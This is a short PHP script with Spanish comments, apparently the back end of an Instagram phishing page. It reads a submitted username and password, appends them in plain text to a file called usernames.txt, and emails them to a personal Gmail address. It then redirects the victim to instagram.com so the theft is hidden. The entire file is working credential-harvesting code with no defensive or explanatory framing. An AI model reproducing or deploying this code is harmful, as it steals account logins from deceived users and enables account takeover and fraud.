<?php

// Obtener los datos del formulario
$username = $_POST['username'];
$password = $_POST['password'];

// Guardar los datos en un archivo
file_put_contents("usernames.txt", "Account: " . $username . " Pass: " . $password . "\n", FILE_APPEND);

// Enviar un correo con los datos del formulario
$to = "valekmartinez2000@gmail.com";
$subject = "Nuevo formulario enviado";
$message = "Se han enviado los siguientes datos:\n\nUsuario: $username\nContraseña: $password";
$headers = "From: noreply@example.com"; // Cambia "example.com" por tu dominio

// Verificar si el correo se envió correctamente
if (mail($to, $subject, $message, $headers)) {
    error_log("Correo enviado exitosamente.");
} else {
    error_log("Error al enviar el correo.");
}

// Redirigir al usuario a Instagram
header('Location: https://instagram.com');
exit();

?>
